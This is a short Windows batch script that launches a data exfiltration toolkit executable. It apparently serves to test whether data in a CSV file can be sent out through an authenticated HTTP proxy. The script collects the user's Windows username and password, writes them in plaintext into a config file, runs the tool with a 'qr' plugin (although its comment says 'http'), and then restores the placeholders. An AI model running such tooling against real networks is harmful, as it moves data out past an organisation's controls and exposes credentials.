@echo off
echo  Data exfiltration toolkit starting ...

rem sanity check
set config=%cd%\det\config.json
set data=%cd%\det\data.csv
set exe=%cd%\det\det.exe
if not exist %config% (
    echo Aborting, expected file not found: %config%
    goto :EOF
)
if not exist %data% (
    echo Aborting, expected file not found: %data%
    goto :EOF
)
if not exist %exe% (
    echo Aborting, expected file not found: %exe%
    goto :EOF
)

rem prompt user for u id and password
echo  Please provide your windows credentials, used for http proxy authentication
set /p uid=Enter your u id:
set /p password=Enter your password:

rem replace http proxy username and password placeholders with user entries
powershell -Command "(gc %config%).replace('{proxy_user}','%uid%').replace('{proxy_password}','%password%') | Out-File -encoding ASCII %config%"

rem run data exfiltration with http plugin
@echo on
%exe% -p qr -c %config% -f %data%

@echo off
rem replace proxy user and password with placeholders back
powershell -Command "(gc %config%).replace('%uid%','{proxy_user}').replace('%password%','{proxy_password}') | Out-File -encoding ASCII %config%"
